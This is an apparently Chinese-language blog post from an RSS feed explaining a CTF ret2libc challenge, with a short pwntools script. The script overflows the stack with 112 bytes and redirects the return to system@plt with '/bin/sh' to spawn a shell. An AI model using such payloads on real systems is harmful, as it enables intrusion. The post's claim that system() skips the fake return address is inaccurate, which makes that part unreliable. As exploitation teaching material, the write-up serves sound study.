+&lt;p&gt;这道题目是典型的 &lt;strong&gt;ret2libc&lt;/strong&gt; 攻击 (Return-to-libc)，目标是通过覆盖栈上的返回地址，绕过程序的正常流程，转而调用  &lt;code&gt;system()&lt;/code&gt;  函数来执行命令（在这个例子中是  &lt;code&gt;/bin/sh&lt;/code&gt; ）。为了理解为什么  &lt;code&gt;system_plt&lt;/code&gt;  后面需要填充一个虚假的地址（ &lt;code&gt;b&#39;b&#39; * 4&lt;/code&gt; ），我们需要详细分析下栈结构和函数调用的过程。&lt;/p&gt;
+&lt;h3 id=&#34;背景知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#背景知识&#34;&gt;#&lt;/a&gt; 背景知识&lt;/h3&gt;
+&lt;p&gt;在  &lt;code&gt;x86&lt;/code&gt;  架构的程序中，函数调用的基本过程如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;压栈&lt;/strong&gt;：当一个函数被调用时，程序会将当前的 &lt;strong&gt;返回地址&lt;/strong&gt; 压入栈中，这个返回地址是程序调用该函数后，程序应该跳转回来的地址。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数传递&lt;/strong&gt;：在栈上，函数的参数会紧随返回地址之后依次被压入栈中。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;栈帧结构&lt;/strong&gt;：每次函数调用时，都会为该函数分配一个栈帧，栈帧中包含：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;返回地址&lt;/strong&gt;：指向调用函数之后的代码位置。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数&lt;/strong&gt;：该函数的参数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;攻击思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击思路&#34;&gt;#&lt;/a&gt; 攻击思路&lt;/h3&gt;
+&lt;p&gt;在这道题中，我们要利用程序中的漏洞，覆盖栈上的返回地址，使得程序在执行  &lt;code&gt;ret&lt;/code&gt; （返回指令）时跳到我们指定的地址，也就是  &lt;code&gt;system()&lt;/code&gt;  函数的地址。&lt;/p&gt;
+&lt;h3 id=&#34;分析代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分析代码&#34;&gt;#&lt;/a&gt; 分析代码&lt;/h3&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./ret2libc1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;binsh_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x8048720&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;system_plt &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x08048460&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; flat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; system_plt&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;b&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; binsh_addr&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;binsh_addr = 0x8048720&lt;/code&gt; &lt;/strong&gt;：这是我们要传给  &lt;code&gt;system()&lt;/code&gt;  函数的参数地址，也就是  &lt;code&gt;/bin/sh&lt;/code&gt;  字符串的地址。 &lt;code&gt;system()&lt;/code&gt;  函数需要一个字符串参数，在这里我们传递的是  &lt;code&gt;/bin/sh&lt;/code&gt;  的地址， &lt;code&gt;system()&lt;/code&gt;  会执行该命令，启动一个 shell。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;system_plt = 0x08048460&lt;/code&gt; &lt;/strong&gt;：这是  &lt;code&gt;system&lt;/code&gt;  函数的地址，在程序中的 &lt;strong&gt;PLT（Procedure Linkage Table）&lt;/strong&gt; 区域。PLT 是程序用来调用动态库函数的一个表，每当程序要调用动态库中的函数时，都会先跳转到 PLT 处，由 PLT 去调用函数的实际地址。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;payload = flat([b&#39;a&#39; * 112, system_plt, b&#39;b&#39; * 4, binsh_addr])&lt;/code&gt; &lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;b&#39;a&#39; * 112&lt;/code&gt; &lt;/strong&gt;：这里填充的是  &lt;code&gt;112&lt;/code&gt;  个字节  &lt;code&gt;a&lt;/code&gt; ，这是覆盖栈帧到返回地址的部分。程序会首先执行一些前期的操作（例如栈的初始化、局部变量等），然后遇到返回地址。因为栈的布局是从高地址到低地址的，所以我们填充  &lt;code&gt;a&lt;/code&gt;  字符来覆盖返回地址的空间，确保在覆盖掉返回地址后，后面的内容是我们想要填充的内容。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;system_plt&lt;/code&gt; &lt;/strong&gt;：这是我们覆盖的返回地址。当栈上的返回地址被覆盖为  &lt;code&gt;system_plt&lt;/code&gt;  后，程序将跳转到  &lt;code&gt;system()&lt;/code&gt;  函数。这个  &lt;code&gt;system_plt&lt;/code&gt;  的地址是硬编码的，它会让程序跳转到  &lt;code&gt;system()&lt;/code&gt;  的实际地址。注意，这个地址是 PLT 表中的地址，在动态链接的程序中，PLT 是一个跳转表，用于跳转到  &lt;code&gt;system&lt;/code&gt;  函数的实际实现地址。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;b&#39;b&#39; * 4&lt;/code&gt; &lt;/strong&gt;：这是一个 &lt;strong&gt;虚假的返回地址&lt;/strong&gt;，也就是说这是我们填充在  &lt;code&gt;system_plt&lt;/code&gt;  后的一个占位符。这个部分的大小是  &lt;code&gt;4&lt;/code&gt;  字节（通常是  &lt;code&gt;x86&lt;/code&gt;  架构的指针大小）。为什么要填充这个虚假的返回地址呢？因为  &lt;code&gt;system()&lt;/code&gt;  函数的调用约定是需要一个参数（即  &lt;code&gt;/bin/sh&lt;/code&gt;  的地址）。这个虚假的返回地址用于模拟栈上  &lt;code&gt;system()&lt;/code&gt;  函数执行完之后返回的地址。我们这样做是为了让栈结构保持正确，在调用  &lt;code&gt;system()&lt;/code&gt;  时，栈帧结构要完整，所以我们需要一个假的返回地址来确保  &lt;code&gt;system()&lt;/code&gt;  执行完成后能正确返回。实际上，在这道题中，虚假的地址  &lt;code&gt;b&#39;b&#39; * 4&lt;/code&gt;  会被  &lt;code&gt;system()&lt;/code&gt;  执行后丢弃。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;binsh_addr&lt;/code&gt; &lt;/strong&gt;：这是我们传递给  &lt;code&gt;system()&lt;/code&gt;  函数的参数  &lt;code&gt;/bin/sh&lt;/code&gt;  字符串的地址。 &lt;code&gt;system()&lt;/code&gt;  函数需要一个字符串作为参数，这个参数是  &lt;code&gt;system()&lt;/code&gt;  在执行时使用的命令，告诉它启动一个 shell。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;sh.sendline(payload)&lt;/code&gt; &lt;/strong&gt;：这一行是将构造好的 payload 发送到程序中，触发栈的溢出和返回地址的修改。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;sh.interactive()&lt;/code&gt; &lt;/strong&gt;：执行完 payload 后，程序将进入交互模式，让我们与程序进行交互，通常在这种 CTF 题目中，这意味着我们已经成功地获得了一个 shell，可以执行命令。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;为什么要填充虚假的地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#为什么要填充虚假的地址&#34;&gt;#&lt;/a&gt; 为什么要填充虚假的地址？&lt;/h3&gt;
+&lt;p&gt;在调用  &lt;code&gt;system()&lt;/code&gt;  函数时，通常在栈上需要有一个返回地址，指示函数执行完之后应该跳转到哪里。由于  &lt;code&gt;system()&lt;/code&gt;  是一个库函数，它执行完成后并不会返回到一个特定的地址，而是会根据调用栈返回到调用它的地方。但是，由于我们要用  &lt;code&gt;ret2libc&lt;/code&gt;  攻击来绕过正常的程序流程，我们通过修改返回地址，使得程序跳转到  &lt;code&gt;system()&lt;/code&gt;  函数。但是  &lt;code&gt;system()&lt;/code&gt;  函数的调用约定仍然需要栈上有一个正确的返回地址（即调用  &lt;code&gt;system()&lt;/code&gt;  后程序会跳回的地址）。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;由于  &lt;code&gt;system()&lt;/code&gt;  在执行后会返回，我们需要一个虚假的返回地址来填补栈上的空隙，确保栈帧结构完整。&lt;/li&gt;
+&lt;li&gt;我们用  &lt;code&gt;b&#39;b&#39; * 4&lt;/code&gt;  来填充这个虚假的返回地址。这里的  &lt;code&gt;4&lt;/code&gt;  字节是因为在 x86 架构中，返回地址是一个指针，占用 4 字节。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;system_plt&lt;/code&gt; &lt;/strong&gt; 是我们想跳转到的地址，即  &lt;code&gt;system()&lt;/code&gt;  函数的入口。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;虚假的返回地址 ( &lt;code&gt;b&#39;b&#39; * 4&lt;/code&gt; )&lt;/strong&gt; 用于保证栈帧的完整性，它只是一个占位符。 &lt;code&gt;system()&lt;/code&gt;  执行后会跳过这个虚假的地址，并且返回到  &lt;code&gt;system()&lt;/code&gt;  函数的调用者。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;binsh_addr&lt;/code&gt; &lt;/strong&gt; 是传递给  &lt;code&gt;system()&lt;/code&gt;  函数的参数，即  &lt;code&gt;/bin/sh&lt;/code&gt;  的地址， &lt;code&gt;system()&lt;/code&gt;  会执行它，启动一个 shell。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这个过程通过巧妙地控制栈上的返回地址，利用系统中已经存在的库函数来执行恶意代码，从而达到绕过程序控制并获取 shell 的目的。&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
